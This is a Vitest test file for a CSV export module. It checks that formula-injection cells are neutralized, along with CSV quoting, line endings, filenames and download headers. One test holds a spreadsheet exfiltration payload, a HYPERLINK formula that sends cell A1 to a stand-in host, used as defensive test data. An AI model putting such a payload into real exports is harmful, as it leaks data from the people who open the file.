import { describe, expect, it } from "vitest";
import { BOM, csvCell, csvFile, csvHeaders, fileStamp, toCsv } from "./csv";

describe("csvCell — formula injection", () => {
  // The whole reason this module exists. A spreadsheet executes a cell that
  // starts with any of these, and the person who opens the export is the
  // person who gets hurt.
  it.each(["=", "+", "-", "@", "\t", "\r"])(
    "neutralizes a cell starting with %j",
    (lead) => {
      const out = csvCell(`${lead}cmd`);
      expect(out.startsWith("'") || out.startsWith('"\'')).toBe(true);
    }
  );

  it("neutralizes a real exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.test?"&A1,"Click me")';
    const out = csvCell(payload);
    // The leading quote must be INSIDE the quoted field, or the quoting
    // undoes the neutralization.
    expect(out).toBe(`"'=HYPERLINK(""http://evil.test?""&A1,""Click me"")"`);
    expect(out.startsWith('"=')).toBe(false);
  });

  it("leaves ordinary text completely alone", () => {
    expect(csvCell("Priya Raman")).toBe("Priya Raman");
    expect(csvCell("tooth 19")).toBe("tooth 19");
  });

  it("does not mistake a negative number for a formula lead-in unquoted", () => {
    // "-5" IS a formula lead-in to Excel, so it must be neutralized. Losing the
    // ability to export a raw negative number is the correct trade: the app
    // exports counts and identifiers, never signed arithmetic.
    expect(csvCell("-5")).toBe("'-5");
  });
});

describe("csvCell — RFC 4180 quoting", () => {
  it("quotes and escapes embedded quotes", () => {
    expect(csvCell('She said "no"')).toBe('"She said ""no"""');
  });

  it("quotes fields containing a comma or newline", () => {
    expect(csvCell("Raman, Priya")).toBe('"Raman, Priya"');
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"');
  });

  it("renders null and undefined as empty, not as the words", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(0)).toBe("0");
    expect(csvCell(false)).toBe("false");
  });
});

describe("toCsv", () => {
  it("uses CRLF line endings and ends with one", () => {
    const out = toCsv(["a", "b"], [[1, 2]]);
    expect(out).toBe("a,b\r\n1,2\r\n");
  });

  it("handles an empty row set without producing a stray blank row", () => {
    expect(toCsv(["a"], [])).toBe("a\r\n");
  });
});

describe("csvFile", () => {
  const now = new Date("2026-08-03T01:23:45.678Z");

  it("prepends the UTF-8 BOM so Excel reads accents correctly", () => {
    const f = csvFile("users", ["name"], [["Núñez"]], now);
    expect(f.body.startsWith(BOM)).toBe(true);
    expect(f.body).toContain("Núñez");
  });

  it("produces a sortable, Windows-legal filename", () => {
    const f = csvFile("audit-log", ["a"], [], now);
    expect(f.filename).toBe("smile-notes-audit-log-2026-08-03T01-23-45.csv");
    // Colons are illegal in Windows filenames and silently mangle a download.
    expect(f.filename).not.toContain(":");
  });

  it("stamps to the second, without fractional noise", () => {
    expect(fileStamp(now)).toBe("2026-08-03T01-23-45");
  });
});

describe("csvHeaders", () => {
  it("forces a download and forbids caching", () => {
    const h = csvHeaders("x.csv");
    expect(h["content-disposition"]).toBe('attachment; filename="x.csv"');
    expect(h["content-type"]).toContain("charset=utf-8");
    // A privileged snapshot must not sit in a shared-workstation cache.
    expect(h["cache-control"]).toContain("no-store");
  });
});
